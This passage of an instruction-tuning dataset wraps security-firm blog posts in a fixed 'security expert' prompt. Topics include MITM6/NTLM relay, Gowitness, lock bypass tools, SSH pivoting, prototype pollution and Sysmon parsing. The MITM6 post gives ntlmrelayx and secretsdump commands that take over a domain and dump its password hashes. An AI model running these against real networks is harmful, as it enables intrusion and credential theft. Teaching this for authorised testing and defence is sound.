plus 4 is 56 With that in mind I kludged together the necessary padding in the code Padding Logic With the padding fixed we were then able to issue commands to the vulnerable server Seeing the properly formatted ipconfig output was equal parts thrilling and relieving Successful Vulnerability Exploitation After that we were pretty much done Dale requested an option to disable the sequence and acknowledgement number output which I obliged by making that part of a new verbose option Demo To verify that the arbitrary command execution part of this whole deal was working Dale ran a few additional commands namely a simple whoami command and a more complex net group 'Domain Admins domain command Both commands worked like a charm Successful whoami Command Execution Successful net group Command Execution Conclusion And with that my first successful adventure in exploit development is at a close I suppose I should sum up some lessons learned during this process especially given that I can't publish the code Pick the right tool for the job and don't be afraid to switch gears if you picked incorrectly I most likely could have made something work in C but Python with Scapy was clearly the path of least resistance and helped us get something working in a reasonable amount of time Don't quit too early If I had gone with my original plan and given up on Friday afternoon we wouldn't have gotten this working and you wouldn't be reading this Always accept invitations to collaborate The best part of sharing projects with other testers is that it might prompt them to ask about related challenges they're working on I've said yes to every invitation I've received on that front and I've rarely ever been disappointed My sincerest thanks to Ron Bowes and Tenable for the vulnerability disclosure and details to penetration testers like David Fletcher for giving me pointers in the right direction and also general encouragement and finally to Dale Hobbs for inviting me to go on this adventure with him for testing the exploit code and providing me pcaps over the weekend while I was finishing the code up"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>MITM6 Strikes Again: The Dark Side of IPv6</title>\n<taxonomies>Dale Hobbs, External/Internal, How-To, Informational, InfoSec 201, IPv6, Machine-in-the-Middle, MITM6, ntlmrelayx, Replication-Get-Changes-All</taxonomies>\n<creation_date>Tue, 14 Feb 2023 16:30:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dale Hobbs As the world becomes increasingly connected through the internet cyber attacks have become more sophisticated and prevalent One type of attack that you may not have heard of is the Machine-in-the-Middle IPv6 MITM6 attack In this article we'll explore what MITM6 attacks are how they work and what you can do to protect yourself and your organization against them What is an MITM6 Attack MITM6 is a type of attack that involves intercepting and manipulating the communication between two parties In this attack the attacker positions themselves between the two parties and acts as a proxy allowing them to intercept and alter the communication between the parties One common method for carrying out an MITM6 attack is through the use of a rogue IPv6 DHCP server The attacker can set up a rogue DHCP server and advertise itself as the default DNS server to devices on the network When a device sends a request to communicate with another device the rogue router intercepts the request and establishes a connection with the target device on behalf of the original sender The attacker can then use this position to intercept and alter the communication between the two devices DNS Takeover attacks via IPv6 Typically people are running IPv4 on their networks However IPv6 is also enabled by default on your network If you look at the network adapter properties on your system you will likely find that IPv6 is turned on even though you're using IPv4 To top it off IPv6 is most likely set to obtain an IPv6 address automatically from a DHCP server but in most cases people are not actively managing IPv6 on the network As such DHCP is usually not configured to manage IPv6 on the network This brings up the question who or what is providing DNS services for IPv6 on the network A majority of the time the answer to that is nobody and nothing This means that an attacker can set up a system to listen for IPv6 DNS requests and respond to them by telling the client to send all of its IPv6 traffic to the attacker's system Often this can allow an attacker to get authentication to a Domain Controller via LDAP or SMB How you ask Well when an attacker's machine is intercepting IPv6 traffic they can intercept authentication requests intercept the NTLM credentials and relay them using ntlmrelayx to a Domain Controller If the relayed authentication request was from a Domain Administrator the attacker can then use that NTLM credential to create a user account for themselves on the domain The best part about this is that the mitm6 tool automagically does all of this for you Let's walk through what this attack looks like First things first you need to download and install the mitm6 tool from ithub.com dirkjanm mitm6 Once that's done simply run the tool as seen below In my case the domain we're testing with is called adlab.com you should replace it with your own domain name As you can see we pretty quickly started to see IPv6 requests on the network indicating that IPv6 addressing is not managed on the network Next we're going to set up ntlmrelayx to relay the requests to LDAPS on a domain controller send the client a fake WPAD file and automatically dump out any information we find to a folder called 'loot on the local system As you can see below a connection request came in our attacking system relayed the connection attempt to the Domain Controller at 192.168.190.200 and successfully authenticated impacket-ntlmrelayx -6 -t ldaps 192.168.190.200 -wh fakewpad.adlab.com -l loot Now if we look in our 'loot directory we can see we've collected a lot of information such as the computers and users on the domain as well as the domain password policy This in itself is incredibly useful as we now have a list of domain users that we could launch password attacks against But wait there's more As luck would have it an administrator logged in to a computer on the network and we can see that the users credentials were relayed to LDAPS and created a user account on the domain for us So now we have a user account on the domain named 'NbuCuQKhZW with a password of 'v Zt J_Snii uo If we look in Active Directory we can confirm that the user account was created Not only did it create an account for us but it created the account with an ACL Access Control List providing the user account with the 'Replication-Get-Changes-All privileges on the domain The 'Replication-Get-Changes-All right in Active Directory allows you to request everything out of Active Directory including password hashes If we look at the ACL for domain we can confirm that the user account has 'Replication-Get-Changes-All privileges on the domain So now that we have a privileged user account on the domain we can use a tool like secretsdump.py to perform a DCSync against the domain controller and download all of the password hashes from the domain mitm6 was even kind enough to suggest using secretsdump.py impacket-secretsdump -just-dc-ntlm adlabs.com NbuCuQKhZW 192.168.190.200 Secretsdump will prompt for the password of the user account in this case that user account was 'NbuCuQKhZW with the password 'v Zt J_Snii uo As you can see in the image above we have successfully dumped the users and password hashes from the domain These can now be taken offline to a password cracking system where you can use a password cracker such as Hashcat to attempt to crack the passwords How Can You Protect Yourself Against MITM6 Attacks MITM6 attacks can be difficult to detect and prevent as they often involve sophisticated techniques and tools However there are steps that organizations and individuals can take to protect against these types of attacks Disabling IPv6 if it is not used on your internal network will prevent Windows clients from querying for a DHCPv6 server thereby making it impossible to take over the DNS server Disable the Proxy Auto detection via Group Policy If your company uses a proxy configuration file internally PAC file it is recommended to explicitly configure the PAC URL instead of relying on WPAD to detect it automatically In order to prevent NTLM relaying you should consider disabling it entirely and switch to Kerberos or if that isn't possible you should enable SMB signing to prevent relaying to SMB by requiring all traffic to be signed enable LDAP signing to prevent unsigned connections to LDAP Enable extended protection for authentication which will prevent some relaying attacks by ensuring that the TLS channel used for the connection to the server is the same that the client uses when authenticating In conclusion MITM6 attacks are a serious threat to the security of your communication By properly managing IPv6 on your network you can help protect yourself and your organization against these types of attacks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Gowitness, a Tester's Time Saver</title>\n<taxonomies>Alyssa Snow, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, Recon, Web App</taxonomies>\n<creation_date>Thu, 16 Feb 2023 18:30:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Alyssa Snow During an external or internal network penetration test it can be challenging to comb through each web server in scope to find the juicy stuff During a timeboxed assessment a tool like Gowitness ithub.com sensepost gowitness wiki can help prioritize the web applications available on your target network Gowitness is an automated website screenshot tool inspired by Eyewitness ithub.com FortyNorthSecurity EyeWitness written in Golang Gowitness navigates to each web application and uses a headless browser to generate screenshots of the web application It fingerprints these applications by capturing the HTML response and HTTP headers Additionally Gowitness attempts to identify technologies used by the application Next it generates a report that allows the tester to browse through the available web services easily Installation Gowitness installation can be as simple as downloading one of the prebuilt binaries found here ithub.com sensepost gowitness releases You can install the tool with go as follows go install github.com sensepost gowitness latest You can run the tool using a docker container docker pull leonjza gowitness You can also clone the repository and compile the tool from the source code git clone ithub.com sensepost gowitness.git cd gowitness make linux Make sure you have Chrome and Golang installed on your machine before attempting to use the tool Gowitness Scanning There are many other automated screenshot tools and I encourage you to investigate whichever interests you most We also have another blog post about Eyewitness ww.blackhillsinfosec.com eyewitness-and-why-it-rocks One cool feature Eyewitness has that I hope to see Gowitness implement at some point is default credential identification Eyewitness will supply the user with default credentials if it knows them alongside the application HTTP header information I use Gowitness because I am a fan of Golang and I like the tool's UI I typically use Gowitness to process Nessus and Nmap scan results Gowitness accepts targets in several formats You can provide the tool with a single target URL a list of URLs IPs or CIDRs Process Nessus scan command gowitness nessus -f basic-scan.nessus GoWitness can process Nmap results in XML format To output Nmap results in XML format you can run Nmap using the -o flag with argument X An example of this is shown below nmap -oX nmap-results.xml Partial Nmap XML Results Process Nmap scan command gowitness nmap -f nmap-results.xml Gowitness has various flag options that can be used to fine-tune your scan For example the --user-agent flag The default user agent string is Mozilla 5.0 Macintosh Intel Mac OS X 10_15_7 AppleWebKit 537.36 KHTML like Gecko Chrome 102.0.0.0 Safari 537.36 Let's say you wanted to experiment with different results using a mobile user-agent string you may set this flag value to something like --user-agent Mozilla 5.0 iPhone CPU iPhone OS 10_3 like Mac OS X AppleWebKit 603.1.23 KHTML like Gecko Version 10.0 Mobile 14E5239e Safari 602.1 I have listed a couple of other useful flags below --timeout timeout string The default is 10 seconds -t --threads threads used to run Gowitness The default is 4 threads If you are on a reliable network but you have many invalid domains you might consider reducing the timeout to 4 to reduce the scanning time I recommend setting the thread count to somewhere between 1 and 2 times the number of cores on your system So if your system has 4 cores you could set the threads to 8 You can keep an eye on your CPU usage and tune up or down if you hit bottlenecks or still have unused cycles Gowitness Results Gowitness stores a screenshot of each of the target URLs in a folder called screenshots Additionally Gowitness creates an SQLite database stored in the file gowitness.sqlite To view the Gowitness results first start up the web server run the following command then navigate to ocalhost 7171 in your browser gowitness server -A Statistics Dashboard The landing page of our Gowitness server displays the statistics detailing the number of processed URLs DNS names and certificates as well as unique technologies observed on the target web servers If a new target pops up you can easily submit a new URL via the UI by clicking Submit New URL Submit New Target Gowitness also supports dark mode which does not necessarily make a difference functionally but it is a feature I love Dark Mode You can review the results in a table format by clicking Table View or view the various web applications in Gallery View Table View While viewing the results in Gallery mode you can enable perception sort which will sort the results based on images that look alike Perception sort allows you to group targets running the same web services and makes testing for issues like default credentials a breeze Perception Sort Gallery Mode Each entry displays the screenshot captured technologies the HTTP Response Headers and other details such as the console log network log DOM and TLS information Screenshot and HTTP Headers Gowitness results are easily searchable You can retrieve results for URLs HTTP Headers Console logs and network logs by typing a query in the search bar For example the following figure shows the search results for all web servers running JQMIGRATE JQMIGRATE Query We can identify Apache web servers by searching for Apache in the HTTP headers Apache Headers We could also query Gowitness API to gather similar details API Query Once you have investigated the processed Gowitness results you can generate a consolidated report Gowitness will create a zip archive of the necessary files and an HTML document of the results gowitness report -f example.zip Consolidated Report Gowitness is an excellent automated screenshot tool that can be extremely useful to help a tester get a quick overview of an extensive list of URLs or scan data post-processing"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Tales From the Pick: Intro to Physical Security Tools</title>\n<taxonomies>How-To, Joseph Kingstone, Physical</taxonomies>\n<creation_date>Tue, 21 Feb 2023 17:42:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joseph Kingstone Looking to get into physical security Not sure what you need to get started Look no further What are Physical Security Assessments Physical security assessments evaluate an organization's physical security measures to identify potential risks and vulnerabilities that could compromise the safety and security of its people assets and facilities The assessment typically involves a combination of physical inspections bypasses lockpicking tailgating and access control abuse to name a few This assists in assessing the effectiveness of existing security measures and identifying areas for improvement This is a basic list of tools where to get them and videos on how to use them Access controls and badge cloning aren't included but there may be a Part 2 in the future Environmental Considerations Awareness of your environment is crucial Being aware of your environment could be the key to you not needing a key TLDR Just look at it Sebaceous Oils Let's begin with a common bypass that is seen with keypads all over the world Sebaceous oils Sebaceous oils are simply oils from your fingers that could cause discoloration on a keypad Anyone could use this to guess the correct combination Below is an example Can you guess the combination Congrats You probably guessed correctly I'm Snow Excited Another use case Is simply looking around your environment for a way In Here Is an interesting edge case where the snowbank was high enough to clear a barbed wire fence This doesn't apply to just snow It could be new construction with dirt or even pallets that are high off the ground Lock Bypasses Why lock bypasses It's fast and usually easy Low complexity and high impact is always valuable for a client You don't need to be a rocket surgeon to use these simple tools Traveler Hook This can be purchased from MBUSA for 3.99 Also known as a shrum tool this tool Is capable of bypassing dead latched locks These locks are almost everywhere Often the deadlatch plunger is not set properly If not set properly an attacker could simply insert the traveler hook in the door gap and push the locking mechanism in opening the door in a matter of seconds Check out this video from our friends at Covert Instruments ww.youtube.com embed 9Vo9XxIMACc Knife Bypass A knife bypass tool is another simple bypass that could be used on certain padlocks It's as simple as sticking the bypass tool into the lock bypassing the locking mechanism You can also use this tool to decode combination locks and file cabinets This tool can be found at Sparrows for 14.95 ww.youtube.com embed l9wMfmNM-RI Wafer Key Bypass Warded locks often located outside of a facility to secure power generators and other valuable assets can be picked with a wafer key This product can be purchased from LockPickWorld for 18.99 ww.youtube.com embed MkiN-rXhjL0 Double Door Tool The double door tool allows an attacker to engage push bars located on double doors from the outside You can purchase the DDT from Sparrows for 16.00 ww.youtube.com embed eUJBXjLKIos Thumb Turn Tool Otherwise known as a J-Tool this tool can fit in between door gaps and twist the handle that twists the bypass mechanism allowing an attacker to open the door from the outside simply by turning the knob This tool can be purchased at Covert Instruments ww.youtube.com embed 1ciqsCJD3f0 Under Door Tool One of the oldest bypass tools an under door tool can be leveraged by placing it under a door rotating the hook and pulling the door lever down This tool can be purchased at Sparrows ww.youtube.com embed QSQo4bcfLbY Lock Picks Sometimes a bypass tool isn't enough and you'll need to use lockpicks to gain access during an engagement Bypasses are ideal but you sometimes need to roll your sleeves up and do some picking A good starter is the Tuxedo Kit from Sparrows From personal experience I would suggest purchasing additional tensioners for stubborn locks Here is a great example of a mica shim not working Next I did a little bit of picking and voila Lock Pick Belt Ranking If you have never picked a lock aren't someone who performs physical security engagements or are just interested in locksport there Is a Reddit post that has a belt ranking system from white belt all the way to black belt It contains locks for each belt and criteria to be ranked It's a fun thing to do in your free time or maybe during a meeting that you aren't actively engaged in Here are a few locks to get you started White Belt Abus 45 Yellow Belt Master Lock 130 Orange Belt Master Lock 150 In Closing the door There you have it Some simple tips and tricks to get your started in your physical security journey All it takes is the right tools and a little know-how"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Forwarding Traffic Through SSH</title>\n<taxonomies>Fernando Panizza, General InfoSec Tips & Tricks, How-To, Informational</taxonomies>\n<creation_date>Thu, 23 Feb 2023 19:06:31 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Fernando Panizza This was meant to be an OpenSSH how-to blog but since I had time I decided to read the man pages manual pages that you can access on a Linux terminal by typing man ssh and had fun chasing every possible rabbit hole while at it While going through the man pages I learned that it was possible to use SSH to set up VPN networks and decided to give it a try Although I just learned this and haven't used it on a test yet I think it could be a nice to have resource especially in cases where the tool in use does not support SOCKS proxies or the protocol is not supported by Proxychains Port Forwarding Port forwarding with SSH is a very well-documented subject but here is a quick recap in case you're new to it You can also find a video explanation by Ralph May here ww.youtube.com watch?v zG4jYmHoEr8 t 348s SSH can be used for local remote and dynamic port forwarding Local port forwarding basically opens a port on your local machine the one that you're SSHing from and forwards its traffic to a remote port on the machine or the network you are connecting to This can be useful once you obtain shell access to a system and find services listening on the loopback or an internal interface Local port forwarding will allow you to forward that service to a port on your local machine The syntax for the command is the following ssh N -L local_port remote_service_ip remote_service_port Optionally you can specify on which interface you want the port to listen by adding the IP address before the port ssh N -L local_ip local_port remote_service_ip remote_service_port As an example let's say you have access to a system 192.168.136.120 and after running netstat you found that there is a service running on port 8080 of the loopback interface For demonstration purposes we are going to use the Python's http.server module to set a web server listening in the loopback interface of our target host which will be hosting a simple text file On the target host we run the following commands to create the file and start the server echo This is a local service file.txt python3 -m http.server --bind 127.0.0.1 8080 Server Started on Target Machine You can forward that port to your local machine with the following command ssh -N -L 8081 127.0.0.1 8080 user 192.168.136.120 This will open port 8081 on your local machine and forward all its traffic to 127.0.0.1 8080 on the remote machine 192.168.136.120 Now if we request the file at 27.0.0.1 8081 file.txt on the testing machine we should be able to access the file hosted at 127.0.0.1 8080 on the target machine File Accessed Using Local Port Forward Remote port forwarding behaves in the opposite way It opens a port on the remote machine and forwards all the traffic to that port from the remote network to a local port on the local machine or network This can be useful when you want to forward a local port to listen on a remote machine The syntax for remote port forwarding is similar this time the -R flag is used and the remote ip and port are specified first ssh -N -R remote_service_ip remote_port local_ip local_port Going back to the previous example let's say you find yourself in the same situation having access to the system 192.168.136.120 and finding a service listening at 127.0.0.1 8080 but this time ingress traffic is blocked on port 22 of the target machine so local port forwarding is not an option In cases like this you can use remote port forwarding to achieve the same result You can use SSH from the target computer to connect to your testing machine and forward local port 8080 on the target to the remote port 8081 on your testing machine ssh -N -R 8081 127.0.0.1 8080 tester 192.168.136.130 SSH Remote Port Forward to Testing Machine Once again you can interact with the service on 127.0.0.1 8081 on your testing machine File Requested over Remote Port Forwarding Dynamic port forwarding starts a SOCKS proxy on your local machine and forwards all the traffic going to that proxy to the remote machine where the connection will be routed based on the application protocol This can be useful when you are in a situation that requires access to multiple ports on the remote network Dynamic port forward is specified by using the -D flag alongside the listening port on the local system ssh -D local_port user host Let's go back to the previous examples but this time let's say that instead of finding a service listening on the localhost you found connections to other hosts and want to enumerate the internal network In this case you can use the following command for dynamic port forwarding The following command will start a SOCKS proxy on port 1080 on the local machine ssh -D 1080 user 192.168.136.120 This will create a local SOCKS proxy which will forward any incoming connection to local port 1080 to the remote system To interact with the local SOCKS proxy you can use tools such as BurpSuite a web browser Proxychains or any other that supports SOCKS proxies As an example we can use Proxychains and Nmap to run a connect scan on the internal network Proxychains by default will attempt to connect to socks4 proxies on port 9050 as stated in its configuration file etc proxychains4.conf We need to modify this configuration with the port where our proxy is listening The following command can be used to change the configuration file sed -i 's socks4 socks5 127.0.0.1 1080 etc proxychains4.conf Your configuration file should look like this now Proxychains4 Configuration File Now we can use Proxychains to run Nmap on the internal network as shown in the following example where we scan the host 10.10.10.128 proxychains4 -q nmap -sT -Pn 10.10.10.128 Connect Scan Running SSH VPN Although port forwarding is the most straightforward method and doesn't require high privileges on the target to set up we may run into limitations with tools not fully supporting SOCKS proxies For instance at the time of this writing Proxychains only supports TCP which limits the types of scans and attacks we can do in the remote network If we try a UDP scan or SYN scan through Proxychains it will fail since UDP is not supported and the SYN scan breaks the TCP handshake Failed SYN Scan Using Proxychains Here is where I think SSH VPNs can be useful since it sets up a point-to-point connection at layer 3 which allows to overcome those limitations Again I'm not saying this is a replacement for port forwarding but can be a useful resource if you have root access on the target system To achieve this a series of configurations are needed both on the testing machine as well as the target machine First we need to add and configure a tun interface on the testing machine by running the following commands as root ip tuntap add mode tun tun0 ip link set dev tun0 up ip addr add 10.1.1.10 24 dev tun0 Running the command ip addr show tun0 in the testing machine should show a new interface with the IP address 10.1.1.10 Tun0 Interface Configuration on Testing Machine Then we need to set up a route to the target's internal network through the new tun0 interface ip route add 10.10.10.0 24 via 10.1.1.10 Running the command ip route show on the testing machine should display the routing information containing the newly added route Routing Configuration on Testing Machine Now on the target machine we need to enable tunneling on the SSH server by setting the PermitTunnel option to yes then reload the service You can use a text editor to add that option to the file etc ssh sshd_config PermitTunnel yes Then reload the configuration using systemctl reload sshd Now that SSH is allowing tunnels we can set up the tun interface on the target system the same way we did in the testing machine ip tuntap add mode tun tun0 ip link set dev tun0 up ip addr add 10.1.1.20 24 dev tun0 Tun0 Interface Configuration on Target Machine And add a route from the internal network to our SSH VPN ip route add 10.1.1.0 24 via 10.1.1.20 Now there are a few more configurations that need to be set up on the target system First IP forwarding needs to be enabled on both the newly created tun interface and the external interface which can be reached from our testing machine Credits to Tim Fowler who helped me with the IP forwarding and NAT set up sysctl -w net.ipv4.conf.tun0.forwarding 1 sysctl -w net.ipv4.conf.ens36.forwarding 1 Also enable NAT on the target system so that incoming packets to the target system know where to go iptables -t nat -A POSTROUTING -o -j MASQUERADE Where is the target system's internal interface which in my case is ens36 Iptables NAT Rule on Internal Interface Finally we can use SSH to tunnel both interfaces and access the internal network The -f flag is used to background the process while the -w flag with the argument 0 0 indicates the command to forward the tunnel device 0 on the local machine to the tunnel device 0 on the remote machine and true is the command to be executed to fork the process to the background this can be any command ssh -f -w 0 0 user 192.168.136.120 true We should now have an established connection with port 22 of the target host that we can check with the command ss -at dport 22 SSH Tunnel Established After the tunnel is established we can interact directly with the internal network without having to use Proxychains conduct SYN scans and interact with other protocols such as ICMP or UDP Nmap SYN Scan over SSH VPN Closing Thoughts While a VPN setup can be an improvement over a SOCKS proxy under certain conditions it requires more configuration and also root access Moreover I was only able to make it work on Linux-to-Linux connections at the time of writing this blog Also port forwarding may be a better option if your tools fully support SOCKS5 and the only option if you don't have root access Nonetheless as penetration testers we never know what kind of situations we are going to encounter and having an extra resource can make a huge difference on a test"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hit the Ground Running with Prototype Pollution</title>\n<taxonomies>Finding, How-To, Informational, Isaac Burton, Web App, Prototype Pollution, Web API</taxonomies>\n<creation_date>Tue, 28 Feb 2023 18:47:31 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Isaac Burton For as long as we have known about prototype pollution vulnerabilities there has been confusion on what they are and how they can be exploited We're going to discuss some of the easiest ways to identify a prototype pollution vulnerability in the wild which can lead to all kinds of exploitation Prototype pollution can exist server side or client side Server-side prototype pollution can be used to modify application control flow which can be fun and rewarding to exploit When a prototype pollution vulnerability is present client-side it can be leveraged to perform cross-site scripting XSS In both cases exploiting prototype pollution is heavily dependent on context Fortunately identifying the vulnerability is often not so difficult We're going to jump into a couple examples just to show how easy identifying this vulnerability can be Then we will dig into why these vulnerabilities occur and explore other methods of identification and exploitation Finding Server-Side Prototype Pollution One of the easiest ways to identify this vulnerability is to send an API method to Burp Suite's Repeater and wrap a JSON formatted request body in a '__proto__ object The example below shows a request that is valid for an imaginary pizza restaurant's website As an example the user is supplying their favorite pizza type and phone number so that they can sign up for a rewards program On the backend the API parses the request body and makes sure that all the required parameters are present If we sent the request below we would receive a 400 Bad Request response We can use this input validation to our advantage We then wrap the valid request body in a '__proto__ object as shown below to which the application returns a 200 OK response It may seem strange that this works but it's our first indicator that there is a vulnerability here At this point there are two potential reasons that this request was accepted 1 The API searches the request body for valid request keys 2 An unsafe merge is being performed more on this later We can send the request below to rule out the first option If the application is searching for valid keys then we should be able to change the '__proto__ object to anything else and the application will respond 200 OK As an example we will change '__proto__ to false_positive Since the application rejected this request we can assume that the '__proto__ object has a special meaning in the application Feel free to try variations such as '_proto_ or '__proto the responses should all return 400 Bad Request If you only receive 200 OK responses when the object's name is '__proto__ then congratulations you just found a server-side prototype pollution vulnerability Later we will dive deeper into why this works and how this can be exploited Testing for Client-Side Prototype Pollution PortSwigger has added automated prototype pollution identification and exploitation into their browser tool DOM Invader The tool can identify sinks and gadgets and even create a proof-of-concept exploit Sinks are places in the code where you can modify the prototype object such as a URL parameter that is unsafely handled by the application Gadgets are locations where polluted objects can be leveraged for exploitation DOM Invader makes finding sinks and gadgets easy just be sure that you have an updated version of Burp Suite and follow the steps below 1 Open DOM Invader in Burp Proxy Intercept Open Browser 2 Go to extensions in the browser enable the Burp Suite extension 3 Turn on DOM Invader and prototype pollution in the extension 4 Reload the page and open the Inspector then navigate to the newly added 'DOM Invader tab 5 If the tool identifies sinks then open the extension back up and enable gadget scanning 6 Reload and navigate back to the Inspector's 'DOM Invader tab You should see a progress bar at the top If any gadgets are identified for the previously found sinks then you should see an option to generate a proof-of-concept exploit as shown below The DOM Invader extension is quite powerful and effective at searching through client-side code which is often minified and difficult to read in the wild If you are interested in the manual approach I highly recommend checking out PortSwigger Academy's course on prototype pollution ortswigger.net web-security prototype-pollution How Does Prototype Pollution Work So why is the '__proto__ object special If you are familiar with object-oriented programming the word 'inheritance should ring a bell When new objects are created they gain properties from their class along with any parent classes In JavaScript there is the concept of a 'prototype object which is essentially the root parent that all objects inherit from In JavaScript the prototype object is writable even at runtime If any properties are added to the prototype then every newly created object will have the property This can allow us to modify variables that developers never intended or expected us to control Consider a server-side merge function which takes the properties from one object and updates them in another You may want to save some of the properties stored in the destination object and only update values that are described in the source object Furthermore objects contained inside other objects need to be copied in the same manner The code snippet below could be a solution to this problem The vulnerability here may not be obvious If an attacker includes a '__proto__ key with the value set to an object the recursion will not only write to the current object's prototype but also the global object's prototype This means that all newly created objects will inherit properties defined by the attacker The consequences of this are only limited by the attacker's imagination Server-Side Prototype Pollution Exploitation Since we cannot go over every possible situation we will just look at a couple examples of how we can leverage this vulnerability Establishing Context Context is king when it comes to prototype pollution The difficulty with exploiting anything server-side is that you typically cannot see what's on the other side First do as much discovery as you can Use Gobuster ithub.com OJ gobuster and discovery wordlists from SecLists ithub.com danielmiessler SecLists to find hidden files and locations on the server If you're lucky you may find a source code repository If the project itself is open-source you're all set to start digging Since the global prototype will be polluted for the life of the thread you may be able to take advantage of open-source libraries used by the application Try to force the server to return error messages through fuzzing One of my favorite tool choices for this is with Burp Suite Intruder and the wordlists provided in wfuzz ithub.com xmendez wfuzz Once the attack is completed you can sort the responses by length and status code and even search for error message keywords The error messages you receive may return partial if not detailed stack traces that can help you map the backend source code Also if you can identify any libraries used by the application you may be able to take advantage of the context provided by the sources Example As an example let's assume that the application performs the following steps upon receiving a POST request The server checks the session token provided in the request headers and accepts or rejects the request The user's ID is stored in the thread's memory for later The URL is matched to a function which updates the user's profile The function unsafely merges the request data into an object to hold the user-supplied data The server verifies that all required properties are included The application creates a user object from information stored in a database A privilege check is performed on the user object where a property is only set for administrative users The function completes its routine by writing back to the user database and returning 200 OK In this scenario an attacker could simply add the administrative property to the '__proto__ object which elevates privilege for the request Remember that every object which is created after prototype pollution is exploited is affected Conclusion With the prevalence of JavaScript API's the strange quirks of the language itself and the non-obvious nature of the vulnerability it's my opinion that we haven't fully discovered the danger and exploitation potential Finally I'd like to point you to some resources that will help you explore this topic further Olivier Arteau wrote a fantastic research paper on this topic which includes discovery and exploitation examples from JavaScript libraries found in the wild aw.githubusercontent.com HoLyVieR prototype-pollution-nsec18 master paper JavaScript_prototype_pollution_attack_in_NodeJS.pdf Another fantastic writeup on this topic is from Changhui Xu who describes the issue very clearly and provides more examples odeburst.io what-is-prototype-pollution-49482fc4b638 Both of the previous sources are referenced by the official CWE Improperly Controlled Modification of Object Prototype Attributes 'Prototype Pollution we.mitre.org data definitions 1321.html PortSwigger has a new course as of this writing on server-side prototype pollution which is available on their academy website ortswigger.net web-security prototype-pollution server-side Lastly I've created a GitHub repository for the example described in the section above The example is roughly 100 lines of code in one file with no dependencies and can be run with Node.js or in a browser console Feel free to use this as a reference or a playground ithub.com syscl0ck Prototype-Pollution Happy Hacking Isaac"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Parsing Sysmon Logs on Microsoft Sentinel</title>\n<taxonomies>Blue Team, Blue Team Tools, How-To, Informational, Jordan Drysdale</taxonomies>\n<creation_date>Tue, 07 Mar 2023 19:23:21 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Tl dr Many parsers have been written and several are referenced here This blog describes a simple parser for Sysmon logs through Event ID EID 28 for Microsoft Sentinel Let's start with a description of the Sysmon schema version As shown below the latest schema version as of 23-DEC-22 was 4.83 This will need to be updated in your Sysmon config files if you wish to stay bleeding edge The following blocks include some additions to the version of Sysmon modular generating as of 23-DEC-22 Modular was referenced in a link above the few lines below allow the writing of Sysmon EIDs 27 and 28 to the operational logs But wait why am I talking about these things in the Sentinel Sysmon parser's GitHub repo Hang tight trust the process we will get through this As you can see default download c users downloads locations in userland get blocked with the Sysmon EID 27 configuration shown above This configuration is insufficient for proper usage for modern protective considerations but demonstrates the possibilities This event then gets written to Windows logs Assuming you are integrated with Microsoft Analytics or Log Analytics agents and are capturing Sysmon logs in your workspace these logs will be queryable in just a few minutes We can now also restrict file shredding in locations we configure with the config file directives Scroll back up and check out the EID 28 config block All we restrict is c users Downloads obviously this is insufficient Shown next is an attempt to SDelete shred the Firefox installer pretend this is an adversary trying to cover their tracks BLOCKED This was also written to the event log Now for the actual goods what we all came here for If you want to make your Sysmon logs meaningful in most SIEMs you need to parse them There are a few parsers available and some appear to be well-maintained The link below was last 